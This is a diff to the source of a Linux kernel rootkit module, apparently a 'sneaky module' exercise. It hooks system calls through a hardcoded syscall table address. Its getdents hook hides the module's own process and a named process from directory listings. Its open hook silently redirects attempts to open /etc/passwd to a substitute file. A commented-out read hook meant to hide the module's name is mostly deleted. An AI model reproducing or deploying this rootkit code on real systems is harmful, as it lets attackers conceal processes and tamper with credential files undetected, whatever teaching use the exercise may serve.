@@ -51,8 +51,8 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
 asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
-asmlinkage int (*original_open)(const char *filename, int flags, int mode);
-//asmlinkage long (*original_read)(int fd, void *buf, size_t count);
+asmlinkage long (*original_open)(const char *filename, int flags, int mode);
+//asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'getdents' syscall
 asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
@@ -70,7 +70,6 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent __user 
     //printk("%s\n", dirp->d_name);
     if (strcmp(dirp->d_name, mypid) == 0 || strcmp(dirp->d_name, processname) == 0)
     {
-      
       printk("%s\n", dirp->d_name);
       memmove(dirp, (char *)dirp + dirp->d_reclen, tlen);
       value -= len;
@@ -86,33 +85,19 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent __user 
   return value;
 }
 
-asmlinkage int sneaky_sys_open(const char *filename, int flags, int mode) {
+asmlinkage long sneaky_sys_open(const char *filename, int flags, int mode) {
   
   if (strcmp(filename, etc_passwd) == 0 )
-  {
     copy_to_user(filename, tmp_passwd , (unsigned)strlen(tmp_passwd) + 1 );
-  } 
   return (*original_open)(filename, flags, mode);
 }
 /*
-asmlinkage long sneaky_sys_read(int fd, void *buf, size_t count) {
-  //if(strcmp())
-  long value = (*original_read)(fd, buf, count);
-  char* sn_pos = strstr(buf, "sneaky_mod");
-  if(sn_pos != NULL) {
-    char temp[256] = {0};
-    printk(KERN_INFO "sneaky_mod\n");
-    char* line_pos = strchr(sn_pos, '\n');
-    size_t length = line_pos - sn_pos + 1;
-    //memmove(sn_pos, line_pos + 1, value - (line_pos - (char*)buf + 1) );
-    memmove(temp, sn_pos, length);
-    printk("this line: %s", temp);
-    //value -= length;
-  }
+asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
+  ssize_t value = (*original_read)(fd, buf, count);
   return value;
   
-}
-*/
+}*/
+
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
